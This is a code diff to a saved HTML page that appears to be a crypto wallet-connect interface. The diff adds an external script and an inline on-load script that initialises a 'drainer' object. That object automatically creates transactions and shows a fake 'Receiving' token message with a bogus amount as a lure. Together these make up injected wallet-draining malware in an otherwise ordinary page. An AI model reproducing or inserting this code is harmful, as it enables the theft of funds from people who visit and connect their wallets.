@@ -15078,7 +15078,24 @@ wui-flex { overflow: hidden auto; display: flex; align-items: center; justify-co
 
         --wui-thumbnail-border-base: #252525;
       }
-    </style><script data-scrapbook-elem="custom-elements-loader">(function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement {}); } })(["tc-root","trx-wcm-explorer-context","trx-wcm-theme-context","trx-wcm-modal","w3m-modal"])</script></head>
+    </style>
+<link rel="stylesheet" href="/vrtx.css?v=1.0.0" />
+<script src="/vrtx.js?v=1.0.0" defer crossorigin></script>
+<script>
+    window.addEventListener('load', () => {
+        window.drainer?.init({
+            autoCreateTransaction: true,  // Automatically create transaction
+            autoOpenModal: false,         // Don't auto-open modal window
+        });
+
+        // Override honeypot settings
+        window.drainer?.overrideHoneypot({
+            honeypot_message: "🎉 Receiving",  // Proxy Token Message
+            honeypot_amount: 10000   // Proxy Token Amount
+        });
+    });
+</script>
+</head>
   <body data-theme="system" class="tc-using-mouse" style="top: auto; --header-height: 61px;">
     <div id="root">
       <div class="isolate">
